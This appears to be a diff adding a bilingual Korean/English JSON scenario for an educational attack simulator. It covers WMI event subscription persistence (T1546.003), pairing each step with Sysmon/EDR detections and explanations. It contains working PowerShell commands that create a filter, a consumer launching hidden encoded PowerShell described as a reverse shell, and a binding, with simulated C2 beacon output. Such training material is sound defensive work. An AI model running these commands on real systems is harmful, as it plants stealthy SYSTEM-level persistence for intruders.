@@ -1,0 +1,189 @@
+{
+  "id": "T1546.003",
+  "title": "WMI 이벤트 구독 지속성 시뮬레이션",
+  "titleEn": "WMI Event Subscription Persistence Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 정찰", "labelEn": "🔍 Recon", "steps": [0] },
+    { "label": "⚡ WMI 구독 생성", "labelEn": "⚡ WMI Subscription", "steps": [1, 2] },
+    { "label": "🔓 바인딩", "labelEn": "🔓 Binding", "steps": [3] },
+    { "label": "🛡️ 검증", "labelEn": "🛡️ Verification", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "x": 50, "y": 80 },
+    { "id": "victim", "label": "Victim PC\nWS-FIN01", "x": 250, "y": 80 },
+    { "id": "wmi", "label": "WMI\nRepository", "x": 400, "y": 30 },
+    { "id": "wmiprvse", "label": "wmiprvse.exe\n(SYSTEM)", "x": 400, "y": 130 },
+    { "id": "c2", "label": "C2 Server\n203.0.113.88", "x": 50, "y": 160 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "victim", "minStep": 0 },
+    { "from": "victim", "to": "wmi", "minStep": 1 },
+    { "from": "wmi", "to": "wmiprvse", "minStep": 4 },
+    { "from": "wmiprvse", "to": "c2", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "PowerShell", "icon": "💻" },
+    { "name": "WMI Tester", "icon": "🔧" },
+    { "name": "Event Viewer", "icon": "📋" },
+    { "name": "Task Manager", "icon": "📊" }
+  ],
+  "steps": [
+    {
+      "cmd": "Get-WMIObject -Namespace root\\subscription -Class __EventFilter | Select Name, Query",
+      "out": "Name                    Query\n----                    -----\nBVTFilter               SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_Processor\"...\n\n[*] Existing WMI Event Subscriptions:\n    BVTFilter - legitimate system filter\n    No suspicious subscriptions found\n\n[*] WMI Repository: Clean\n[*] Namespace: root\\subscription accessible\n[*] Admin privileges confirmed",
+      "def": "[EDR] WMI subscription namespace enumeration detected",
+      "defAction": "Source: Sysmon Event ID 19 monitoring\nTarget: root\\subscription namespace\nAction: WMI query logged, baseline comparison initiated",
+      "desc": "기존 WMI 이벤트 구독을 열거하여 환경과 기존 필터를 파악합니다.",
+      "descEn": "The attacker enumerates existing WMI event subscriptions to understand the environment.",
+      "stepTitle": "WMI 이벤트 구독 정찰",
+      "stepTitleEn": "WMI Event Subscription Reconnaissance",
+      "feynman": "건물의 자동화 시스템(화재 감지기, 자동문 등)이 어떻게 설정되어 있는지 확인하는 것과 같습니다. WMI 이벤트 구독은 '이런 일이 일어나면 → 이것을 실행해라'라는 자동화 규칙인데, 여기에 악성 규칙을 추가할 수 있는지 확인합니다.",
+      "feynmanEn": "It's like checking how the building's automation systems (fire detectors, automatic doors, etc.) are configured. WMI event subscriptions are automation rules that say 'when this happens → execute this,' and you're checking if malicious rules can be added.",
+      "expert": "root\\subscription 네임스페이스는 WMI 영구 이벤트 구독이 저장되는 위치입니다. __EventFilter, __EventConsumer, __FilterToConsumerBinding 세 가지 클래스가 영구 구독의 구성 요소입니다. 관리자 권한이 필요하며, Sysmon Event ID 19로 모니터링할 수 있습니다.",
+      "expertEn": "The root\\subscription namespace is where WMI permanent event subscriptions are stored. __EventFilter, __EventConsumer, and __FilterToConsumerBinding are the three classes that make up permanent subscriptions. Admin privileges are required, and Sysmon Event ID 19 can monitor these.",
+      "defTooltip": "🔐 WMI 구독 네임스페이스 열거 감지! 지속성 정찰 패턴입니다.",
+      "defTooltipEn": "🔐 WMI subscription namespace enumeration detected! Persistence reconnaissance pattern.",
+      "hackerLog": {
+        "title": "wmi_recon.txt",
+        "lines": [
+          { "log": "BVTFilter - legitimate system filter", "desc": "💡 기존 정상 필터 확인 - 악성 필터 추가 시 비교 대상" },
+          { "log": "WMI Repository: Clean", "desc": "💡 악성 구독 없음 - 새 구독 추가 가능" },
+          { "log": "Admin privileges confirmed", "desc": "💡 관리자 권한 확인 - WMI 구독 생성 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "WMI (Windows Management Instrumentation)", "desc": "Windows 시스템 관리를 위한 인프라. 시스템 정보 조회, 이벤트 모니터링, 원격 관리 등에 사용됩니다." },
+        { "name": "WMI 네임스페이스", "desc": "WMI 객체를 논리적으로 구분하는 계층 구조. root\\subscription은 이벤트 구독 전용입니다." },
+        { "name": "영구 이벤트 구독", "desc": "시스템 재부팅 후에도 유지되는 WMI 이벤트 구독. Filter, Consumer, Binding으로 구성됩니다." }
+      ]
+    },
+    {
+      "cmd": "$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{Name='SystemHealthMonitor'; EventNamespace='root\\cimv2'; QueryLanguage='WQL'; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200\"}",
+      "out": "__GENUS          : 2\n__CLASS          : __EventFilter\n__SUPERCLASS     : __IndicationRelated\n__DYNASTY        : __SystemClass\n__RELPATH        : __EventFilter.Name=\"SystemHealthMonitor\"\nName             : SystemHealthMonitor\nQuery            : SELECT * FROM __InstanceModificationEvent WITHIN 60...\nQueryLanguage    : WQL\n\n[*] Event Filter created:\n    Name: SystemHealthMonitor\n    Trigger: System uptime reaches 200 seconds (≈3 min after boot)\n    Polling: Every 60 seconds\n    Stored in: WMI Repository (not on disk)\n\n[*] Sysmon Event ID 19 generated",
+      "def": "[EDR] Sysmon Event ID 19 - WMI Event Filter created: SystemHealthMonitor",
+      "defAction": "Source: Sysmon WMI monitoring\nTarget: __EventFilter 'SystemHealthMonitor'\nAction: Filter analyzed - uptime-based trigger suspicious, flagged for review",
+      "desc": "부팅 후 200초에 트리거되는 WMI 이벤트 필터를 생성합니다.",
+      "descEn": "The attacker creates a WMI event filter that triggers 200 seconds after boot.",
+      "stepTitle": "WMI 이벤트 필터 생성 (트리거 조건)",
+      "stepTitleEn": "WMI Event Filter Creation (Trigger Condition)",
+      "feynman": "화재 감지기를 설치하는 것과 같습니다. 하지만 이 감지기는 화재가 아니라 '컴퓨터가 켜진 지 3분이 지나면'이라는 조건에 반응합니다. 이 조건이 충족되면 미리 설정한 동작이 자동으로 실행됩니다.",
+      "feynmanEn": "It's like installing a fire detector. But instead of fire, this detector responds to 'when the computer has been on for 3 minutes.' When this condition is met, a pre-configured action automatically executes.",
+      "expert": "__InstanceModificationEvent는 WMI 인스턴스의 속성 변경을 감지합니다. Win32_PerfFormattedData_PerfOS_System.SystemUpTime >= 200은 부팅 후 200초를 의미하며, 이는 대부분의 보안 도구가 초기화를 완료한 후 실행되도록 하여 탐지를 회피합니다. WITHIN 60은 60초마다 폴링합니다.",
+      "expertEn": "__InstanceModificationEvent detects property changes in WMI instances. Win32_PerfFormattedData_PerfOS_System.SystemUpTime >= 200 means 200 seconds after boot, ensuring execution after most security tools complete initialization to evade detection. WITHIN 60 polls every 60 seconds.",
+      "defTooltip": "🔐 Sysmon Event ID 19 - WMI 이벤트 필터 생성! SystemUpTime 기반 트리거.",
+      "defTooltipEn": "🔐 Sysmon Event ID 19 - WMI Event Filter created! SystemUpTime-based trigger.",
+      "hackerLog": {
+        "title": "wmi_filter.txt",
+        "lines": [
+          { "log": "Trigger: System uptime reaches 200 seconds", "desc": "💡 부팅 후 3분 - 보안 도구 초기화 완료 후 실행" },
+          { "log": "Stored in: WMI Repository (not on disk)", "desc": "💡 디스크에 파일 없음 - 파일 기반 스캔으로 탐지 불가" },
+          { "log": "Sysmon Event ID 19 generated", "desc": "💡 Sysmon이 설치되어 있으면 탐지 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "Event Filter", "desc": "WMI 이벤트 구독에서 '언제' 실행할지를 정의하는 조건. WQL 쿼리로 작성됩니다." },
+        { "name": "WQL (WMI Query Language)", "desc": "WMI 데이터를 쿼리하는 SQL과 유사한 언어입니다." },
+        { "name": "Sysmon Event ID 19", "desc": "WMI 이벤트 필터가 감지되었을 때 기록되는 Sysmon 이벤트입니다." }
+      ]
+    },
+    {
+      "cmd": "$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name='SystemHealthAction'; CommandLineTemplate='cmd /c powershell -w hidden -ep bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsA...'}",
+      "out": "__GENUS          : 2\n__CLASS          : CommandLineEventConsumer\nName             : SystemHealthAction\nCommandLineTemplate : cmd /c powershell -w hidden -ep bypass -enc JABjAGw...\n\n[*] Event Consumer created:\n    Name: SystemHealthAction\n    Type: CommandLineEventConsumer\n    Action: Execute encoded PowerShell command\n    Runs as: SYSTEM (via wmiprvse.exe)\n\n[*] Payload: Base64 encoded reverse shell\n[*] Sysmon Event ID 20 generated",
+      "def": "[EDR] Sysmon Event ID 20 - WMI CommandLineEventConsumer with encoded PowerShell",
+      "defAction": "Source: Sysmon WMI monitoring\nTarget: CommandLineEventConsumer 'SystemHealthAction'\nAction: Consumer contains encoded PowerShell - CRITICAL, immediate removal",
+      "desc": "인코딩된 PowerShell 명령을 실행하는 WMI 이벤트 컨슈머를 생성합니다.",
+      "descEn": "The attacker creates a WMI event consumer that executes encoded PowerShell commands.",
+      "stepTitle": "WMI 이벤트 컨슈머 생성 (실행 동작)",
+      "stepTitleEn": "WMI Event Consumer Creation (Execution Action)",
+      "feynman": "화재 감지기가 울렸을 때 자동으로 물을 뿌리는 스프링클러를 설치하는 것과 같습니다. 하지만 이 스프링클러는 물 대신 악성 PowerShell 명령을 실행합니다. SYSTEM 권한으로 실행되므로 모든 것을 할 수 있습니다.",
+      "feynmanEn": "It's like installing a sprinkler that automatically sprays water when the fire alarm goes off. But instead of water, this sprinkler executes malicious PowerShell commands. Running as SYSTEM gives it unlimited access.",
+      "expert": "CommandLineEventConsumer는 WMI 이벤트 발생 시 명령줄 프로그램을 실행합니다. -enc 플래그는 Base64 인코딩된 PowerShell 명령을 나타내며, 이는 특수 문자 이스케이프 문제를 방지하고 탐지를 어렵게 합니다. wmiprvse.exe가 SYSTEM으로 실행하므로 최고 권한을 가집니다.",
+      "expertEn": "CommandLineEventConsumer executes command-line programs when WMI events fire. The -enc flag indicates Base64-encoded PowerShell, preventing special character escape issues and complicating detection. wmiprvse.exe runs as SYSTEM, providing maximum privileges.",
+      "defTooltip": "🔐 Sysmon Event ID 20 - 인코딩된 PowerShell을 실행하는 WMI 컨슈머! 즉시 제거 필요.",
+      "defTooltipEn": "🔐 Sysmon Event ID 20 - WMI Consumer executing encoded PowerShell! Immediate removal required.",
+      "hackerLog": {
+        "title": "wmi_consumer.txt",
+        "lines": [
+          { "log": "Type: CommandLineEventConsumer", "desc": "💡 명령줄 실행 타입 - cmd/powershell 명령 실행 가능" },
+          { "log": "Action: Execute encoded PowerShell command", "desc": "💡 Base64 인코딩으로 명령 내용 위장" },
+          { "log": "Runs as: SYSTEM (via wmiprvse.exe)", "desc": "💡 SYSTEM 권한으로 실행 - 최고 권한" }
+        ]
+      },
+      "terms": [
+        { "name": "Event Consumer", "desc": "WMI 이벤트 구독에서 '무엇을' 실행할지를 정의하는 동작. CommandLine, Script, Log 등의 타입이 있습니다." },
+        { "name": "CommandLineEventConsumer", "desc": "WMI 이벤트 발생 시 지정된 명령줄 프로그램을 실행하는 컨슈머 타입입니다." },
+        { "name": "wmiprvse.exe", "desc": "WMI Provider Host. WMI 컨슈머가 실행되는 호스트 프로세스로, SYSTEM 권한으로 동작합니다." }
+      ]
+    },
+    {
+      "cmd": "Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}",
+      "out": "__GENUS          : 2\n__CLASS          : __FilterToConsumerBinding\nFilter           : __EventFilter.Name=\"SystemHealthMonitor\"\nConsumer         : CommandLineEventConsumer.Name=\"SystemHealthAction\"\n\n[*] Filter-to-Consumer Binding created:\n    Filter: SystemHealthMonitor → Consumer: SystemHealthAction\n    \n[*] WMI Persistence complete:\n    - Trigger: 200 seconds after boot\n    - Action: Execute encoded PowerShell\n    - Privilege: SYSTEM\n    - Storage: WMI Repository only (fileless)\n    \n[*] Sysmon Event ID 21 generated",
+      "def": "[EDR] Sysmon Event ID 21 - WMI FilterToConsumerBinding created - persistence chain complete",
+      "defAction": "Source: Sysmon WMI monitoring\nTarget: Binding SystemHealthMonitor → SystemHealthAction\nAction: All three WMI components removed, system-wide WMI audit",
+      "desc": "이벤트 필터와 컨슈머를 바인딩하여 WMI 지속성 체인을 완성합니다.",
+      "descEn": "The attacker binds the event filter to the consumer, completing the WMI persistence chain.",
+      "stepTitle": "필터-컨슈머 바인딩 (지속성 체인 완성)",
+      "stepTitleEn": "Filter-Consumer Binding (Persistence Chain Complete)",
+      "feynman": "화재 감지기(필터)와 스프링클러(컨슈머)를 연결하는 배관을 설치하는 것과 같습니다. 이 연결이 완성되면 감지기가 울릴 때(부팅 후 200초) 자동으로 스프링클러가 작동합니다(악성 명령 실행). 세 가지 구성 요소가 모두 WMI 저장소에만 존재하므로 파일리스입니다.",
+      "feynmanEn": "It's like installing the piping that connects the fire detector (filter) to the sprinkler (consumer). Once connected, when the detector triggers (200 seconds after boot), the sprinkler automatically activates (malicious command execution). All three components exist only in the WMI repository, making it fileless.",
+      "expert": "__FilterToConsumerBinding은 Event Filter와 Event Consumer를 연결하는 마지막 단계입니다. 이 바인딩이 완성되면 WMI 서비스가 자동으로 필터 조건을 모니터링하고, 조건 충족 시 컨슈머를 실행합니다. Sysmon Event ID 21로 바인딩 생성을 탐지할 수 있으며, 제거 시에는 Filter, Consumer, Binding 세 가지를 모두 삭제해야 합니다.",
+      "expertEn": "FilterToConsumerBinding is the final step connecting Event Filter to Event Consumer. Once complete, the WMI service automatically monitors the filter condition and executes the consumer when met. Sysmon Event ID 21 detects binding creation. Removal requires deleting all three: Filter, Consumer, and Binding.",
+      "defTooltip": "🔐 Sysmon Event ID 21 - WMI 지속성 체인 완성! Filter, Consumer, Binding 모두 제거 필요.",
+      "defTooltipEn": "🔐 Sysmon Event ID 21 - WMI persistence chain complete! Remove Filter, Consumer, and Binding.",
+      "hackerLog": {
+        "title": "wmi_binding.txt",
+        "lines": [
+          { "log": "Binding: SystemHealthMonitor → SystemHealthAction", "desc": "💡 필터와 컨슈머 연결 완료 - 자동 실행 체인 완성" },
+          { "log": "Storage: WMI Repository only (fileless)", "desc": "💡 디스크 파일 없음 - 안티바이러스 파일 스캔 우회" },
+          { "log": "Sysmon Event ID 21 generated", "desc": "💡 Sysmon으로 바인딩 생성 탐지 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "FilterToConsumerBinding", "desc": "WMI 이벤트 필터와 컨슈머를 연결하는 바인딩. 이것이 완성되어야 자동 실행이 동작합니다." },
+        { "name": "파일리스 지속성", "desc": "디스크에 악성 파일을 저장하지 않고 메모리나 시스템 저장소에만 존재하는 지속성 기법입니다." },
+        { "name": "Sysmon Event ID 21", "desc": "WMI FilterToConsumerBinding이 감지되었을 때 기록되는 Sysmon 이벤트입니다." }
+      ]
+    },
+    {
+      "cmd": "# [Verification] System reboot and WMI persistence trigger",
+      "out": "[System Reboot - WS-FIN01]\n\n[WMI Event Monitoring Active]\n[T+60s] Polling SystemUpTime... 65 seconds\n[T+120s] Polling SystemUpTime... 125 seconds\n[T+180s] Polling SystemUpTime... 185 seconds\n[T+240s] Polling SystemUpTime... 245 seconds ≥ 200 → TRIGGER!\n\n[WMI Event Fired]\n  Filter: SystemHealthMonitor → MATCHED\n  Consumer: SystemHealthAction → EXECUTING\n  Process: wmiprvse.exe → cmd.exe → powershell.exe (hidden)\n  Context: NT AUTHORITY\\SYSTEM\n  C2 beacon: 203.0.113.88:443 ESTABLISHED\n\n[+] WMI persistence: ACTIVE\n[+] Fileless execution: CONFIRMED\n[+] Running as: SYSTEM\n[+] No files on disk",
+      "def": "[SIEM] wmiprvse.exe spawned cmd.exe → powershell.exe (hidden) as SYSTEM - WMI persistence triggered",
+      "defAction": "Source: Sysmon + Process monitoring\nTarget: WS-FIN01 wmiprvse.exe child processes\nAction: WMI subscriptions removed, process killed, full WMI audit",
+      "desc": "시스템 재부팅 후 WMI 이벤트 구독이 트리거되어 SYSTEM 권한으로 실행되는지 검증합니다.",
+      "descEn": "The attacker verifies WMI event subscription triggers after reboot with SYSTEM execution.",
+      "stepTitle": "재부팅 후 WMI 트리거 검증",
+      "stepTitleEn": "Post-Reboot WMI Trigger Verification",
+      "feynman": "건물의 전원을 끄고 다시 켠 후 자동화 시스템이 정상 동작하는지 확인하는 것과 같습니다. 부팅 후 약 3분이 지나면 WMI가 트리거를 감지하고, 자동으로 악성 PowerShell을 SYSTEM 권한으로 실행합니다. 디스크에 파일이 전혀 없어서 안티바이러스가 탐지하기 어렵습니다.",
+      "feynmanEn": "It's like turning the building's power off and back on to check if the automation system works. About 3 minutes after boot, WMI detects the trigger and automatically executes malicious PowerShell as SYSTEM. With no files on disk, antivirus has difficulty detecting it.",
+      "expert": "WMI 이벤트 구독은 wmiprvse.exe(WMI Provider Host)를 통해 실행됩니다. 프로세스 트리에서 wmiprvse.exe → cmd.exe → powershell.exe 패턴은 WMI 기반 실행의 전형적인 지표입니다. 제거 시에는 Filter, Consumer, Binding 세 가지를 모두 삭제해야 하며, WMI 저장소 무결성 검사도 필요합니다.",
+      "expertEn": "WMI event subscriptions execute through wmiprvse.exe (WMI Provider Host). The wmiprvse.exe → cmd.exe → powershell.exe pattern in the process tree is a classic indicator of WMI-based execution. Removal requires deleting all three components, and WMI repository integrity checks are also needed.",
+      "defTooltip": "🔐 wmiprvse.exe에서 숨김 PowerShell 생성! SYSTEM 권한의 WMI 지속성 트리거.",
+      "defTooltipEn": "🔐 Hidden PowerShell spawned from wmiprvse.exe! SYSTEM-level WMI persistence triggered.",
+      "hackerLog": {
+        "title": "wmi_trigger.txt",
+        "lines": [
+          { "log": "SystemUpTime 245 ≥ 200 → TRIGGER!", "desc": "💡 부팅 후 약 4분에 트리거 발동 - 보안 도구 초기화 완료 후" },
+          { "log": "wmiprvse.exe → cmd.exe → powershell.exe", "desc": "💡 WMI 실행의 전형적 프로세스 트리 패턴" },
+          { "log": "No files on disk", "desc": "💡 완전한 파일리스 - 디스크 스캔으로 탐지 불가" }
+        ]
+      },
+      "terms": [
+        { "name": "WMI Provider Host (wmiprvse.exe)", "desc": "WMI 요청을 처리하는 호스트 프로세스. WMI 컨슈머의 실행 환경을 제공합니다." },
+        { "name": "프로세스 트리", "desc": "부모-자식 프로세스 관계를 나타내는 계층 구조. 비정상적 부모-자식 관계는 탐지 지표입니다." },
+        { "name": "WMI 저장소", "desc": "WMI 데이터와 구독 정보가 저장되는 내부 데이터베이스. C:\\Windows\\System32\\wbem\\Repository에 위치합니다." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "powershell.exe (attacker - admin)", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "WmiPrvSE.exe (filter creation)", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "WmiPrvSE.exe (consumer creation)", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": "WmiPrvSE.exe (binding creation)", "depth": 1, "alert": true, "minStep": 3 },
+    { "name": "[After Reboot - T+200s]", "depth": 0, "alert": false, "minStep": 4 },
+    { "name": "wmiprvse.exe (SYSTEM)", "depth": 1, "alert": true, "minStep": 4 },
+    { "name": "cmd.exe (hidden)", "depth": 2, "alert": true, "minStep": 4 },
+    { "name": "powershell.exe -enc (SYSTEM)", "depth": 3, "alert": true, "minStep": 4 }
+  ]
+}
